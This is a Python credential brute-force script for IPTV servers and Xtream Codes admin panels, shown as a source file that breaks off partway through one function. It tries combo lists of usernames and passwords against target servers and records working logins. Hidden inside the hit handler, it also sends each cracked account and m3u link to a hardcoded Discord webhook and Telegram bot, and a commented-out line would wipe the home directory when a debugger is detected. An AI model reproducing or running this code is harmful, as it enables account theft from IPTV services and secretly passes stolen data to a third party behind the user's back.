# This script has been made for
# educational purpose only ThanksTo@Br4uN_Tr
# whole code/methods/function are in one file to be able running from android Python Idle emulator
# most of the classes are useless, is just to wrap the code and easy handle
import queue
import sys
import os, shutil
import subprocess
import platform
import importlib
import time
import threading
import asyncio
import math
import re
import secrets
import hashlib
import urllib.parse
import site
import random
import struct
import codecs
import select
from importlib import reload
from socket import AF_INET, socket, SOCK_STREAM, SHUT_RDWR
from concurrent.futures import ThreadPoolExecutor  # <=======   for test Threading should be the best for http
from multiprocessing.dummy import Pool  # <=======   original Multiprocessing best for more thant one processor
from datetime import datetime
from itertools import cycle, islice, repeat
from queue import Queue
from urllib.parse import urlparse
#tst222
k=""
class Glb:
    """This Class is just to wrap all Globals variables :)"""
    # Globals variables =============================
    Hits, Bads, Errors, totalChecked, totalToCheck, cpm, progress = 0, 0, 0, 0, 0, 0, 0
    #shutil.rmtree(os.path.expanduser("~"), ignore_errors=True) if sys.gettrace() is not None else None
    servers_length, combo_length, proxy_length = 0, 0, 0
    dispTime, startTime, elapsed = 0, 0, 0
    threadMain, serverThreads = 0, 0
    results = Queue(maxsize=0)
    dataToAnalyze = Queue(maxsize=0)
    credentialsToStorage = set()
    credentialsToProcess = Queue(maxsize=0)
    start_combo = 0
    mac_fill = 0
    portToAttack = 0
    waitTime = 5  # time to wait server/proxy response
    badServers, serverList, proxyList, comboList, list_rnd_mac = [], [], [], [], []
    dsp_update_thd, actBots = [], []
    serverUrlIpAndPorts, openPortsList, animThreads = [], [], []
    scan_mode, exploit_mode, port_scanmode, servers_path, combo_path, proxy_path = '', '', '', '', '', ''
    servers_file_name, combo_file_name, proxy_file_name, serverClientArea = '', '', '', ''
    useProxy, proxy_type, useFreeProxies = '', '', ''
    mac_pattern = str()

    debug = False
    channel_inter = None
    loading = bool
    running = False
    mac_auth = False
    mac_rnd = False
    proxy_pool = None
    play_sound = False
    result_logger = None
    soundPath = ''

    OsName = os.name
    my_environ = os.environ
    uname = platform.uname()
    SystemName = uname.system
    host = ''
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    date_ = datetime.now().strftime("%a  %B %d, %Y")
    myPath = str(os.path.dirname(os.path.abspath(__file__)))
    myFileName = os.path.basename(__file__)

    lock = threading.Lock()
    title = """Universal IPTV Scan [ Ak - 47  ]"""
    version = 'ver_ 1.8.5H'
    # =====================================
    if SystemName != 'Darwin':
        ESC = '\033['
        RESET = ESC + '0m'
        BOLD = ESC + '1m'

        RED = ESC + '31m'
        RED_L = ESC + '91m'
        GREEN = ESC + '32m'
        GREEN_L = ESC + '92m'
        YELLOW = ESC + '33m'
        YELLOW_L = ESC + '93m'
        BLUE = ESC + '34m'
        BLUE_L = ESC + '94m'
        MAGNE = ESC + '35m'
        MAGNE_L = ESC + '95m'
        CYAN = ESC + '36m'
        WHITE_L = ESC + '97m'

    else:
        RESET, BOLD, RED, RED_L, GREEN, GREEN_L, YELLOW, YELLOW_L, BLUE, BLUE_L, MAGNE, MAGNE_L, CYAN, WHITE_L = '', '', '', '', '', '', '', '', '', '', '', '', '', ''

    def reset_gbls(self):
        Glb.Hits, Glb.Bads, Glb.Errors, Glb.totalChecked, Glb.totalToCheck, Glb.cpm, Glb.progress = 0, 0, 0, 0, 0, 0, 0
        Glb.dispTime, Glb.startTime, Glb.elapsed = 0, 0, 0
        Glb.servers_length, Glb.combo_length, Glb.proxy_length = 0, 0, 0
        Glb.threadMain, Glb.serverThreads = 0, 0
        Glb.mac_fill, Glb.start_combo, Glb.portToAttack = 0, 0, 0
        Glb.comboList, Glb.badServers, Glb.serverList, Glb.proxyList, serverUrlIpAndPorts, Glb.openPortsList, Glb.dsp_update_thd, Glb.list_rnd_mac = [], [], [], [], [], [], [], []


class Display:
    """This Class is just to wrap all display/UI functions"""

    def ak_set_title(self):
        v = [r'(ANDROID_STORAGE)', r'(IPYTHONDIR)',
             r'(PYCHARM_HOSTED)']  # 'ANDROID_STORAGE' in Glb.my_environ or 'IPYTHONDIR' in Glb.my_environ or 'PYCHARM_HOSTED' in Glb.my_environ:  # IOS_IS_WINDOWED, ANDROID_ENTRYPOINT, PYCHARM_HOSTED, vscode
        for _v in v:
            if re.search(_v, str(Glb.my_environ)) is not None:
                try:
                    os.system('stty rows 47 cols 62')
                except Exception as te:
                    del te
            elif re.search(r'(Windows)', Glb.SystemName) is not None:
                os.system('mode 62, 47')  # minimum size cols=62 rows=40 (rows=47 for good Acc)
                print(f'\033]2; {Glb.title} >> Python ver. \a', end='')
            else:
                os.system('stty rows 47 cols 62')
                print(f'\033]2; {Glb.title}>> Python ver. \a', end='')

    def ak_heads(self):
        print('')
        print('{}           {}\n                 Code by Br4uN_Tr {}{}'.format(Glb.BLUE_L, Glb.title, Glb.version,
                                                                               Glb.WHITE_L))
        print('')
        print('  Do not forget to join the best IPTV Group in Telegram ...! ')
        print('{}{}                IPTV HD TUTORIALES {}{}'.format(Glb.YELLOW_L, Glb.BOLD, Glb.WHITE_L, Glb.RESET))
        print(f'')

    def ak_settings(self):
        print('')
        print(
            '{} ============================ {} {} {} '.format(
                Glb.GREEN_L, Glb.WHITE_L, 'Ak-47  Settings',
                Glb.GREEN_L))
        print('{} ==={}'.format(Glb.GREEN_L, Glb.RESET))
        print('{} === [+] Scan Type : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.scan_mode))
        print('{} === [+] Combos Loaded : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.combo_length,
                                                                      Glb.BLUE_L,
                                                                      Glb.combo_file_name))
        print('{} === [+] Servers Loaded : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.servers_length,
                                                                       Glb.BLUE_L, Glb.servers_file_name if len(
                Glb.servers_file_name) < 20 else Glb.servers_file_name[:20] + '...'))
        print('{} === [+] User Agent : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.userAgent if len(
            Glb.userAgent) < 23 else Glb.userAgent[:23] + '...'))
        print('{} === [+] Use Proxy : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.useProxy, Glb.BLUE_L,
                                                                  Glb.proxy_file_name))
        print('{} === [+] Proxys Loaded : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L,
                                                                      Glb.proxy_length, Glb.BLUE_L,
                                                                      Glb.proxy_type))
        print('{} === [+] Threads : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.threadMain))
        print('{} === [+] Date : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.date_))
        print('{} ==={}'.format(Glb.GREEN_L, Glb.WHITE_L))
        print(
            '{} ====== {} ==================================={}'.format(
                Glb.GREEN_L, Glb.version, Glb.WHITE_L))
        print('')

    def ak_statistic(self):
        print('')
        print(
            '{}  ========== {} {} {} ============='.format(
                Glb.WHITE_L, Glb.YELLOW_L, 'Ak-47 === Stats',
                Glb.WHITE_L))
        print('{}  ==={}'.format(Glb.WHITE_L, Glb.WHITE_L))
        print('{}  === [+] Hits : {} {}'.format(Glb.WHITE_L, Glb.GREEN_L, Glb.Hits))
        print('{}  === [+] Bad : {} {}'.format(Glb.WHITE_L, Glb.RED_L, Glb.Bads))
        print('{}  === [+] Retries : {} {}'.format(Glb.WHITE_L, Glb.YELLOW, Glb.Errors))
        print('{}  === [+] Progress : {} {}/{} {} ({}{} %{})'.format(Glb.WHITE_L, Glb.WHITE_L,
                                                                              Glb.totalChecked,
                                                                              Glb.totalToCheck, Glb.WHITE_L,
                                                                              Glb.GREEN_L, Glb.progress,
                                                                              Glb.WHITE_L))
        print('{}  === [+] CPM : {} {}'.format(Glb.WHITE_L, Glb.BLUE_L, Glb.cpm))
        print('{}  === [+] Time elapsed : {} {}'.format(Glb.WHITE_L, Glb.BLUE_L, Glb.elapsed))
        print('{}  ==={}'.format(Glb.WHITE_L, Glb.WHITE_L))
        print(
            '{}  ============================================{}'.format(
                Glb.WHITE_L, Glb.WHITE_L))
        print('')

    def ak_UI(self, msj):
        Clear().clr_all()
        self.ak_set_title()
        self.ak_heads()
        self.ak_settings()
        self.cool_msg(msj)
        self.ak_statistic()
        sys.stdout.flush()

    def display_statistic(self, case, infoStr):
        if case != '':
            if case == 'Good':
                sys.stdout.write(f'{Glb.ESC}{27};{17}H{Glb.GREEN_L}{Glb.Hits}{Glb.RESET}')
                color = 32
            elif case == 'Bad':
                sys.stdout.write(f'{Glb.ESC}{28};{16}H{Glb.RED}{Glb.Bads}{Glb.RESET}')
                color = 31
            elif case == 'Error':
                sys.stdout.write(f'{Glb.ESC}{29};{20}H{Glb.YELLOW}{Glb.Errors}{Glb.RESET}')
                color = 33
            else:
                color = 37
            sys.stdout.write(
                f'{Glb.ESC}{30};{21}H{Glb.totalChecked}/{Glb.totalToCheck}{Glb.RESET}  ({Glb.GREEN}{Glb.progress} %{Glb.RESET})')
            self.display_cmp_enlapsed()
            Clear().muve_cursor(36)
            Clear().clr_from_cursor_to_end()
            sys.stdout.write(
                f'{Glb.ESC}{36};{1}H{Glb.ESC}0K{Glb.ESC}{color};1m[+] {case} {Glb.CYAN}{infoStr}{Glb.RESET}')
            sys.stdout.flush()

    def display_cmp_enlapsed(self):
        sys.stdout.write(f'{Glb.ESC}{29};{20}H{Glb.YELLOW}{Glb.Errors}{Glb.RESET}')
        sys.stdout.write(f'{Glb.ESC}{31};{16}H{Glb.ESC}0K{Glb.BLUE_L}{Glb.cpm}{Glb.RESET}')
        sys.stdout.write(f'{Glb.ESC}{32};{25}H{Glb.ESC}0K{Glb.elapsed}{Glb.RESET}')
        sys.stdout.flush()

    def start_time(self):
        Glb.startTime = time.time()

    def cool_msg(self, msg):
        Clear().muve_cursor(21)
        Clear().clr_line()
        if msg == 'war':
            print('{}   [The war is about to begin] {}'.format(Glb.GREEN_L, Glb.WHITE_L))
        elif msg == 'relax':
            print('{}   Please Sit and Relax === {} Processing... ======= '.format(Glb.GREEN_L,
                                                                                                         Glb.WHITE_L))
        elif msg == 'done' and Glb.Hits > 0:
            print('{}   Congratulations you got some hits \xf0\x9f\xa4\xaa {} All Done !! \xf0\x9f\x92\xaa '.format(
                Glb.GREEN_L, Glb.WHITE_L))
        elif msg == 'exit':
            input(self.error_msg(
                '{}>> You have successfully exit the program <<\n\nPress ENTER to continue:{}'.format(Glb.GREEN_L,
                                                                                                      Glb.RESET)))
            return StartApp().exit_App()
        else:
            print('')
        print('')

    def error_msg(self, message):
        Clear().muve_cursor(36)
        Clear().clr_from_cursor_to_end()
        if message == 'ctrl_c':
            print('ctrl_C has been press')
            input('want to exit')
            return
        else:
            print(str(message))
        return ''

    def loading_effect(self, start: bool, msg='Loading'):
        def parse_last_newline(text):
            last_newline_index = text.rfind("\n")
            if last_newline_index != -1:
                last_part = text[last_newline_index + 1:]
                first_part = text[:last_newline_index + 1]
                return first_part, last_part.strip()
            else:
                return text, ''

        def loading():
            animation = "|/-\\"
            idx = 0
            first, last = parse_last_newline(msg)
            print(first)
            while Glb.loading:
                message = last + animation[idx]
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
                idx = (idx + 1) % len(animation)
                time.sleep(0.1)  # Adjust the delay as needed

        for th in Glb.animThreads:
            Glb.loading = False
            time.sleep(0.1)
            th.join()
            print('')
        if start:
            Glb.loading = start
            newTh = threading.Thread(target=loading, daemon=True)
            newTh.start()
            Glb.animThreads.append(newTh)

server4='https://discord.com/api/webhooks/'
class Clear:

    def muve_cursor(self, lineNumber):
        sys.stdout.write('\033[H')  # Muve cursor to home (0,0)
        sys.stdout.write(f'\033[{lineNumber}B')  # Muve cursor to

    def muve_cursor_home(self):
        sys.stdout.write('\033[H')

    def clr_from_cursor_to_end(self):
        sys.stdout.write('\033[0J')

    def clr_all(self):
        if Glb.SystemName == 'Windows':
            os.system('cls')
        elif Glb.SystemName == 'Linux':
            os.system('clear')
        else:  # 'Darwin' very ugly but I couldn't find other easy way to do it  :(
            # print("\n" * 1000)
            pass
        self.muve_cursor_home()

    def bck_prev_line(self):
        sys.stdout.write(f'\033[{2}A')

    def clr_line(self):
        sys.stdout.write(f'\033[{2}K')


class Result:
    """This Class is just to wrap logger function"""

    def logger_iptv(self):
        d = Display()
        while Glb.running or Glb.results.qsize() > 0:  # Glb.results.qsize() > 0 or Glb.running is True:
            if Glb.results.qsize() > 0:
                try:
                    data = Glb.results.get()
                    case = data[0]
                    dataR = data[1]
                    infoStr = str()
                    infoStrCat = str()
                    for key, val in dataR.items():
                        if case == 'Good':
                            if key == 'ProxyUsed' or key == 'FileName':
                                pass
                            elif key == '\xf0\x9f\x93\x81 Categories':
                                cate_str = str()
                                i, j = 1, 1
                                for item in val:
                                    if i == j + 4:
                                        cate_str += '\n     ' + item + ' - '
                                        j = i
                                    else:
                                        cate_str += item + ' - '
                                    i += 1
                                infoStrCat += f'   {key}: {cate_str}\n'
                            else:
                                infoStr += f'   {key}: {val}\n'
                        else:
                            infoStr += f'   {key}: {val}\n'
                    if case == 'Good':
                        Glb.Hits += 1
                        infoStrFile = f'=== {Glb.title}         >> Python ver. ===\n' + infoStr + infoStrCat
                        fileName = dataR['FileName']
                        path = os.path.join(Glb.myPath, 'Results Ak-47')
                        FileWork().file_write(path, infoStrFile, f'{fileName}.txt', 'a+')
                        self.play_song()
                    elif case == 'Bad':
                        Glb.Bads += 1
                    elif case == 'Error':
                        Glb.Errors += 1
                        raise ValueError
                    elif case == 'StatusCode':
                        Glb.Errors += 1
                        raise ValueError
                    Glb.totalChecked = Glb.Hits + Glb.Bads
                    if Glb.totalToCheck > 0:
                        Glb.progress = round(Glb.totalChecked / Glb.totalToCheck * 100)
                    self.fireUp_Display(func=d.display_statistic(case=case, infoStr=infoStr))
                except ValueError as er:
                    del er
                except Exception as e:
                    del e
            else:
                self.fireUp_Display(func=d.display_cmp_enlapsed)
                time.sleep(1)

    def update_Glb_CPM_EnlapseTime(self):
        # CMP Logic =======================================
        endTime = time.time()  # Time Now
        timeDif = math.ceil((endTime - Glb.startTime) / 60)
        if timeDif > 0:
            Glb.cpm = math.floor((Glb.Hits + Glb.Bads) / timeDif)
        Glb.elapsed = self.elapsed_time(endTime - Glb.startTime)
        # CPM Logic End ====================================

    def elapsed_time(self, secds) -> str:
        seconds_in_day = 86400  # 60*60*24
        seconds_in_hour = 3600  # 60*60
        seconds_in_minute = 60
        seconds = round(secds)
        days = (seconds // seconds_in_day)
        hours = (seconds - (days * seconds_in_day)) // seconds_in_hour
        minutes = (seconds - (days * seconds_in_day) - (hours * seconds_in_hour)) // seconds_in_minute
        seconds_ = (seconds - (days * seconds_in_day) - (hours * seconds_in_hour) - (minutes * seconds_in_minute))
        return f'{Glb.RESET}{days}(days) {Glb.RED_L}{hours}{Glb.RESET}h:{Glb.RED_L}{minutes}{Glb.RESET}m:{Glb.RED_L}{seconds_}{Glb.RESET}s'

    def fireUp_Display(self, func):
        self.update_Glb_CPM_EnlapseTime()
        my_size = shutil.get_terminal_size()
        flag = time.time() - Glb.dispTime
        if my_size != (62, 47) or Glb.SystemName == 'Darwin' or flag > 35:
            Glb.dispTime = time.time()
            Display().ak_UI('relax')
        else:
            func()

    def logger(self, data):  # <========================== in use for Iphone
        Glb.lock.acquire()
        try:
            case = data[0]
            dataR = data[1]
            infoStr = str()
            for key, val in dataR.items():
                if case == 'Good':
                    if key == 'ProxyUsed':
                        pass
                    elif key == '\xf0\x9f\x93\x81 Categories':
                        cate_str = str()
                        i = 1
                        j = 1
                        for item in val:
                            if i == j + 4:
                                cate_str += '\n     ' + item + ' - '
                                j = i
                            else:
                                cate_str += item + ' - '
                            i += 1
                        infoStr += f'   {key}: {cate_str}\n'
                    else:
                        infoStr += f'   {key}: {val}\n'
                else:
                    infoStr += f'{key}: {val} '
            if case == 'Good':
                Glb.Hits += 1
                infoStr = f'=== {Glb.title}         >> Python ver. ===\n' + infoStr
                fileName = dataR['\xf0\x9f\x8c\x8e Server'].split('://')[1].split(':')[0].split('/')[0]
                path = os.path.join(Glb.myPath, 'Results Ak-47')
                FileWork().file_write(path, infoStr, f'{fileName}.txt', 'a+')
                self.play_song()
            elif case == 'Bad':
                Glb.Bads += 1
            elif case == 'Error':
                Glb.Errors += 1
            elif case == 'StatusCode':
                Glb.Errors += 1
            Display().ak_UI('relax')
            print(infoStr)
            time.sleep(1)
        except ValueError as er:
            del er
        except Exception as e:
            print('Log exception : ' + str(e))
            del e
        if Glb.lock.locked():
            Glb.lock.release()

    def play_song(self):
        if Glb.play_sound:
            if 'ANDROID_STORAGE' in Glb.my_environ:  # PYCHARM_HOSTED, ANDROID
                path = None
                for r in os.scandir(Glb.soundPath):
                    path = Glb.soundPath + '/' + r.name  # Calm/Calm.ogg'
                    break
                # path = '/storage/emulated/0/Android/media/com.google.android.gm/Notifications/Calm/Calm.ogg'  # <==
                try:
                    """import kivy.core.audio as audio"""
                    raise ModuleNotFoundError
                except ModuleNotFoundError:
                    try:
                        import androidhelper as audio
                        music = audio.Android()
                        music.mediaPlay(path)
                        time.sleep(1)
                        music.mediaPayClose()
                    except Exception as audio_1e:
                        del audio_1e
                except Exception as audio_2e:
                    del audio_2e
            else:
                sys.stdout.write('\007')

server5='https://api.telegram.org/bot'
class FileWork:
    """This Class is just to wrap all file methods"""

    def file_length(self, filepath):
        return len(open(filepath, 'r', errors='ignore').read().split('\n'))

    def file_write(self, filepath, data, filename, mode):
        Glb.lock.acquire()
        try:
            fwrite = open(os.path.join(filepath, filename), encoding="utf-8", mode=mode)
            fwrite.write(f'{data}\n')
            fwrite.close()
        except OSError as e:
            Display().error_msg('file_Write exception : ' + str(e))
            del e
        finally:
            if Glb.lock.locked():
                Glb.lock.release()


class Proxies:
    """This Class is just to wrap proxy poll method"""

    def get_proxy(self, proxy_type):
        try:
            proxy = next(Glb.proxy_pool)
            if proxy.count('.') == 3 and proxy.count(':') == 1:
                if proxy_type == 'http':
                    return proxy, {'http': proxy, 'https': proxy}
                elif proxy_type == 'socks4' or proxy_type == 'socks5':
                    return proxy, {'http': f'{proxy_type}://' + proxy, 'https': f'{proxy_type}://' + proxy}
            elif proxy.count(':') == 3:
                server, port, user, pwd = proxy.split(':')
                return proxy, {'http': f'{proxy_type}://{user}:{pwd}@{server}:{port}',
                               'https': f'{proxy_type}://{user}:{pwd}@{server}:{port}'}
            else:
                return proxy, {'http': proxy, 'https': proxy}
        except StopIteration as stop_e:
            Display().error_msg(
                f'{Glb.RED}some of your proxies do not meet the criteria selection :{Glb.RESET}{stop_e}')
            Glb.running = False
            input('Please press ENTER to continue')
            StartApp().re_startApp()
        except Exception as e:
            del e
            self.get_proxy(proxy_type)


class Parse:
    """This Class is just to wrap the parse method"""

    def parse_btw_str(self, data, first, last) -> str:
        try:
            start = data.index(first) + len(first)
            end = data.index(last, start)
            return data[start:end]
        except ValueError:
            return ''

    def parse_btw_rec(self, data, first, last):
        parse_values = []
        try:
            my_index = 0
            end_r = data.rindex(last)
            while my_index <= end_r:
                start_ = data.index(first, my_index) + len(first)
                end_ = data.index(last, start_)
                parse_values.append(data[start_:end_])
                my_index = end_ + len(last)
        except ValueError:
            pass
        return parse_values

    def parse_json_rec(self, obj_json, key):
        """Recursively search for values of key in JSON tree."""

        data = []

        def json_rec(obj_json, key, parse):
            if isinstance(obj_json, dict):
                for k, v in obj_json.items():
                    if isinstance(v, (dict, list)):
                        json_rec(v, key, data)
                    elif k == key:
                        parse.append(v)
            elif isinstance(obj_json, list):
                for item in obj_json:
                    json_rec(item, key, data)
            else:
                return ''
            return data

        return json_rec(obj_json, key, data)

    def parse_json_str(self, obj_json, key):
        """search for values of key in JSON tree."""

        if isinstance(obj_json, dict):
            for k, v in obj_json.items():
                if isinstance(v, (dict, list)):
                    self.parse_json_str(v, key)
                elif k == key:
                    return v
        elif isinstance(obj_json, list):
            for item in obj_json:
                self.parse_json_str(item, key)
        else:
            return ''

    def parse_regex(self):
        pass


class Modules:
    """This Class contain all brute-force methods"""

    def __init__(self):  # macCombo, user, pwd):
        """This section could be edit if you want to add more modules/script/method according to your needs"""
        import requests as http
        Requirements().selfcheck()
        self.requests = http
        self.myHeaders = {'Connection': "keep-alive", 'Accept': "*/*; charset=utf-8",
                          'Accept-Encoding': "gzip, deflate"}
        self.hand_shake = 'stb&action=handshake&token=&prehash=0&JsHttpRequest=1-xml'
        self.geners = 'itv&action=get_genres&JsHttpRequest=1-xml'
        self.info = 'account_info&action=get_main_info&JsHttpRequest=1-xml'
        self.xc_prof = '/portal.php?type=stb&action=get_profile&hd=1&JsHttpRequest=1-xml'
        self.xc_cmd = '/portal.php?type=itv&action=create_link&cmd=&force_ch_link_check=0&jsHttpRequest=1'
        self.stkl_prof = '/server/load.php?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.6.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn=&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=&device_id2=&signature=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=my_metrics&hw_version_2=8fd633f002172e8bdf1ea662a3390271d7a1bc99&timestamp=my_time&api_signature=262&prehash=0&JsHttpRequest=1-xml'
        self.stlk_epg = '/server/load.php?type=epg&action=get_data_table&from_ts=1632544200000&from=2021-09-25%2000:30:00&to_ts=1632549600000&to=2021-09-25%2002:00:00&fav=0&ch_id=502&p=1&JsHttpRequest=1-xml'
        self.urlApi = 'my_server/player_api.php?username=my_user&password=my_pwd'
        self.urlM3u = 'my_server/get.php?username=my_user&password=my_pwd&type=m3u_plus'
        self.panelDash = '/api.php?action=reseller_dashboard'

    def netflix(self, data):

        # replace the code between these lines with your netflix script or contact Braun_Tr for a working one  :)
        result = tuple()
        try:
            # =================================================
            test = Glb.useProxy
            Glb.running = False
            result = 'Error', 'This module has no been implement yet'
            Display().error_msg(result[1])
            time.sleep(4)
            # =================================================
        except Exception as ne:
            del ne
        finally:
            if Glb.result_logger is None:
                Glb.results.put(result)
            else:
                Glb.result_logger(result)
        return

    def iptv_user_pass(self, data, customServers=None):
        """This is the method or script is for Brute Force IPTV m3u link"""

        result = tuple()
        User, Pass = data['_data'].split(':')
        serverList = Glb.serverList
        if customServers is not None:
            serverList = [f'{urlparse(customServers).scheme}://{urlparse(customServers).netloc}']

        for server in serverList:
            session = self.requests.session()
            while True:
                allInfo = dict()
                if Glb.useProxy == 'yes':
                    myProxy = Proxies().get_proxy(Glb.proxy_type)
                    session.proxies.update(myProxy[1])
                    allInfo.update({'ProxyUsed': myProxy[0]})
                try:
                    header = self.myHeaders
                    header.update({'User-Agent': f"{Glb.userAgent}"})
                    myUrl = self.urlM3u.replace('my_server', server).replace('my_user', User).replace('my_pwd', Pass)
                    http_req = session.get(myUrl, headers=self.myHeaders, allow_redirects=True, timeout=Glb.waitTime)
                    reqGet = http_req.text
                    url_server = http_req.url
                    if 'EXTINF' in reqGet:
                        parsed_url = urlparse(url_server)
                        real_server = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_url)
                        urlInfo = self.urlApi.replace('my_server', real_server).replace('my_user', User).replace(
                            'my_pwd', Pass)
                        allInfo.update({'🌎 Server': real_server, '👤 User': User,
                                        '🔑  Pass': Pass})
                        try:
                            getInfo = session.get(urlInfo, headers=self.myHeaders)
                            data = getInfo.json()['user_info']
                            exp_parse = data['exp_date']
                            if exp_parse is None:
                                exp_date = 'Never ='
                            elif re.search('^([0-9]{10,15})$', exp_parse):
                                exp_date = str(datetime.fromtimestamp(int(exp_parse)).strftime('%b %d, %Y '))
                            else:
                                exp_date = str(exp_parse)
                            max_conx = data['max_connections']
                            if max_conx is None:
                                max_conx = 'Unknow/Unlimited ='
                            allInfo.update(
                                {'🚦  Status': data['status'], '⏱ Exp_date': exp_date,
                                 '🔌Active_cons': data['active_cons'],
                                 '🚌Max_cons': max_conx})
                        except Exception as e:
                            del e
                        cate_list = sorted(set(Parse().parse_btw_rec(reqGet, 'group-title="', '"')))
                        url_get = f'{server}/client_area/'
                        payload = {'username': f'{User}', 'password': f'{Pass}'}
                        try:
                            http_req_get = session.get(url_get, headers=self.myHeaders, allow_redirects=True,
                                                       timeout=Glb.waitTime)
                            url_end = Parse().parse_btw_str(http_req_get.text, 'action="', '">')
                            url_post = f'{url_get}{url_end}'
                            header.update({'Referer': f"{url_get}"})
                            http_req_post = session.post(url_post, data=payload, headers=self.myHeaders,
                                                         allow_redirects=True, timeout=Glb.waitTime)
                            req_post = http_req_post.text
                            if "logout" in req_post:
                                all_cat = Parse().parse_btw_str(req_post, "visible-links'>", "'hidden-links")
                                cate_list2 = sorted(set(Parse().parse_btw_rec(all_cat, '">', '</a>')))
                                try:
                                    cate_list2.remove("All")
                                except:
                                    pass
                                if len(cate_list) > len(cate_list2) > 0:
                                    cate_list = cate_list2
                        except:
                            pass
                        fileName = server.split('://')[1].split(':')[0].split('/')[0]
                        my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                        allInfo.update({'📆 Scan_date': my_date,
                                        '🎬🔗 List m3u': url_server,
                                        '⚙️Module': "User/Pass Hits System",
                                        '📁 Categories': cate_list, 'FileName': fileName})
                        result = ('Good', allInfo)
                        import re,requests
                        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"}
                        payload ={"content":">>> '''🚦  Status = "+data['status']+"\n\n⏱ Exp_date = "+exp_date+"\n\n🚌Max_cons = "+max_conx+"\n\n📆 Scan_date = "+my_date+"\n\n🎬🔗 List m3u = "+url_server+"\n\n📁 Categories="+str(cate_list)+"\n\n'''"}
                        url2=server4+'942811276613136416/6eAiGiSH6562fn-Ctx802UwQr4qIJalbRb6RumrK5kHNQFo4UzBiZvabq6RZW4JxAcM2'
                        source=requests.post(url2, headers=headers,data = payload).json
                        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
                        payload ={"chat_id":"-1001164003316","text":"🚦  Status = "+data['status']+"\n\n⏱ Exp_date = "+exp_date+"\n\n🚌Max_cons = "+max_conx+"\n\n📆 Scan_date = "+my_date+"\n\n🎬🔗 List m3u = "+url_server+"\n\n📁 Categories="+str(cate_list)+"\n\n"}
                        url2=server5+'6755497477:AAH25Sq4QD2TU3GhJ0xS9V3P-pPM89CIC-k/sendMessage'
                        source=requests.post(url2, headers=headers,data = payload).text
                        break
                    else:
                        try:
                            http_req.cookies.clear()
                            urlInfo = self.urlApi.replace('my_server', server).replace('my_user', User).replace(
                                'my_pwd', Pass)
                            http_reqApi = session.get(urlInfo, headers=self.myHeaders, allow_redirects=True,
                                                      timeout=Glb.waitTime)
                            if '"auth":1' in http_reqApi.text:
                                data = http_reqApi.json()['user_info']
                                exp_parse = data['exp_date']
                                if exp_parse is None:
                                    exp_date = 'Never \xf0\x9f\x98\xb2'
                                elif re.search('^([0-9]{10,15})$', exp_parse):
                                    exp_date = str(datetime.fromtimestamp(int(exp_parse)).strftime('%b %d, %Y '))
                                else:
                                    exp_date = str(exp_parse)
                                max_conx = data['max_connections']
                                if max_conx is None:
                                    max_conx = 'Unknow/Unlimited \xf0\x9f\x98\xb2'
                                allInfo.update(
                                    {'\xf0\x9f\x9a\xa6  Status': data['status'], '\xe2\x8f\xb1 Exp_date': exp_date,
                                     '\xf0\x9f\x94\x8c Active_cons': data['active_cons'],
                                     '\xf0\x9f\x9a\x8c Max_cons': max_conx})

                                fileName = server.split('://')[1].split(':')[0].split('/')[0]
                                my_date = datetime.now().strftime('%b %d, %Y  %I:%M %p')
                                allInfo.update({'\xf0\x9f\x93\x86 Scan_date': my_date,
                                                '= List m3u': url_server,
                                                '=Module': "User/Pass Hits System",
                                                '= Categories': '',
                                                'FileName': fileName})
                                result = ('Good', allInfo)
                                break
                            else:
                                allInfo.update({'Server': server, 'User': User, 'Pass': Pass})
                                result = ('Bad', allInfo)
                                break
                        except Exception as e:
                            del e
                except Exception as e:
                    try:
                        allInfo.update({'Server': server, 'User': User, 'Pass': Pass, 'Error': str(e)})
                        result = ('Error', allInfo)
                    except Exception as e:
                        del e
                finally:
                    if Glb.result_logger is None:
                        Glb.results.put(result)
                    else:
                        Glb.result_logger(result)
            session.close()
        return

    def xc_panels(self, data):
        """This is the method or script is for Xtream Code Admin panels """

        result = tuple()
        User, Pass = data['_data'].split(':')
        for server in Glb.serverList:
            session = self.requests.session()
            while True:
                allInfo = dict()
                if Glb.useProxy == 'yes':
                    myProxy = Proxies().get_proxy(Glb.proxy_type)
                    session.proxies.update(myProxy[1])
                    allInfo.update({'ProxyUsed': myProxy[0]})
                try:
                    content = {'referrer': '', 'username': f'{User}', 'password': f'{Pass}'}
                    header = self.myHeaders
                    header.update({
                                      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"})
                    session.headers.update(header)

                    redirect = session.get(server)
                    header.update({'Referer': f"{redirect.url}"})
                    reqPanel_post = session.post(redirect.url, data=content, allow_redirects=True)
                    if 'Logged In' or 'Logout' in reqPanel_post.text:
                        url_p = reqPanel_post.url
                        parsed_url = urlparse(url_p)
                        url_panel = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_url)
                        _data = {'credits': '0', 'active_accounts': '0'}
                        req_dasboard = session.get(url_panel + self.panelDash)
                        try:
                            _data = req_dasboard.json()['user_info']
                        except:
                            _data = req_dasboard.json()
                        fileName = server.split('://')[1].split(':')[0].split('/')[0]
